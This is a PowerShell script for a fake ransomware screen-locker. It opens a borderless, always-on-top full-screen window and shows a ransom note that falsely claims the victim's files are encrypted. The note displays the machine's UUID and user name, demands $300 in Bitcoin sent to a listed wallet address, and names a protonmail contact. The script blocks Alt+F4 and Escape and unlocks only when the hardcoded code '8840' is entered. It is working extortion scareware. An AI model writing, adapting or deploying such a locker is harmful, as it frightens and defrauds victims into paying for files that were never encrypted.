Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.BackColor = 'Black'
$form.TopMost = $true
$form.KeyPreview = $true

# Get screen dimensions
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

# Dynamic font sizes
$headerFontSize = [Math]::Min([int]($screenHeight * 0.05), 48)
$bodyFontSize = [Math]::Min([int]($screenHeight * 0.025), 26)
$inputFontSize = [Math]::Min([int]($screenHeight * 0.025), 24)

# Gather device info
$deviceID = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$username = $env:USERNAME
$hostname = $env:COMPUTERNAME

# Combined Text with proper line breaks using `r`n
$instructions = "Ooops, your important files are encrypted.`r`n`r`n" +
"▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮`r`n`r`n" +
"If you see this text, then your files are no longer accessible, because they have been encrypted. Perhaps you are busy looking for a way to recover your files, but don't waste your timе. Nobody can recover your files without our decryption service.`r`n`r`n" +
"Device ID: $deviceID`r`n" +
"User: $username@$hostname`r`n`r`n" +
"We guarantee that you can recover all your files safely and easily. need to do is submit the payment and purchase the decryption key. All you`r`n`r`n" +
"Instructions:`r`n" +
"Send `$300 worth of Bitcoin to this address:`r`n" +
"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX`r`n`r`n" +
"`r`n" +
"Send your Bitcoin wallet ID and the following installation key to:`r`n" +
"wnshth123456@protonmail.com`r`n`r`n" +
"`r`n" +
"Installation Key:`r`n" +
"zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A`r`n`r`n" +
"After payment, you will receive your decryption key.`r`n`r`n" +
"If you already have the key, enter it below:"

$body = New-Object Windows.Forms.TextBox
$body.Multiline = $true
$body.ReadOnly = $true
$body.BackColor = 'Black'
$body.ForeColor = 'Red'
$body.Font = New-Object Drawing.Font("Consolas", $bodyFontSize)
$body.Text = $instructions
$body.Dock = 'Fill'
$form.Controls.Add($body)

# Input Panel
$inputPanel = New-Object Windows.Forms.Panel
$inputPanel.Dock = 'Bottom'
$inputPanel.Height = [int]($screenHeight * 0.12)
$inputPanel.BackColor = 'Black'

$keyLabel = New-Object Windows.Forms.Label
$keyLabel.Text = "Key:"
$keyLabel.ForeColor = 'Red'
$keyLabel.Font = New-Object Drawing.Font("Consolas", $inputFontSize)
$keyLabel.AutoSize = $true
$keyLabel.Location = New-Object Drawing.Point(50, [int]($inputPanel.Height/2 - $inputFontSize/2))

$keyBox = New-Object Windows.Forms.TextBox
$keyBox.Width = [int]($screenWidth * 0.3)
$keyBox.Font = New-Object Drawing.Font("Consolas", $inputFontSize)
$keyBox.Location = New-Object Drawing.Point(120, [int]($inputPanel.Height/2 - $inputFontSize/2))
$keyBox.ForeColor = 'Red'
$keyBox.BackColor = 'Black'

$submit = New-Object Windows.Forms.Button
$submit.Text = "Submit"
$submit.Font = New-Object Drawing.Font("Consolas", $inputFontSize, 'Bold')
$submit.Location = New-Object Drawing.Point($keyBox.Location.X + $keyBox.Width + 20, $keyBox.Location.Y - 2)
$submit.BackColor = 'DarkRed'
$submit.ForeColor = 'White'

# Modified submit action - exits on code "8840"
$submit.Add_Click({
    if ($keyBox.Text -eq "8840") {
        [System.Windows.Forms.MessageBox]::Show("valid key.","successful",0,'Information')
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Invalid key. Decryption failed.","Error",0,'Error')
    }
})

# Allow Enter key to submit
$keyBox.Add_KeyDown({
    if ($_.KeyCode -eq "Enter") {
        $submit.PerformClick()
    }
})

$inputPanel.Controls.Add($keyLabel)
$inputPanel.Controls.Add($keyBox)
$inputPanel.Controls.Add($submit)
$form.Controls.Add($inputPanel)

# Block closing (except with correct code)
$form.Add_KeyDown({
    if ($_.Alt -and $_.KeyCode -eq "F4") { $_.Handled = $true }
    if ($_.KeyCode -eq "Escape") { $_.Handled = $true }
})

[System.Media.SystemSounds]::Exclamation.Play()
$form.ShowDialog()
